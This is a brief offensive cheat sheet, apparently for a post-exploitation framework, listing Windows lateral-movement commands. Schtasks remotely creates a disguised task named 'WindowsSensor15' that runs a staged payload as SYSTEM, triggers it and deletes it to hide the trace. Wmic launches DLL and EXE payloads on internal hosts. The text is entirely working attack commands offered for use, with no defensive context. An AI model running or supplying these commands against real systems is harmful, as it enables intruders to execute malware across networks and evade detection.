# Run a payload using SCHTASKS
```
shell SCHTASKS /s ip\hostname /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
shell SCHTASKS /s ip\hostname /run /TN "WindowsSensor15"
shell schtasks /S ip\hostname /TN "WindowsSensor15" /DELETE /F
```
# launching dll payload looks like this
```
shell wmic /node:172.16.0.36 process call create "rundll32.exe C:\ProgramData\p64.dll StartW"
```
# Executing the payload EXE
```
shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
```
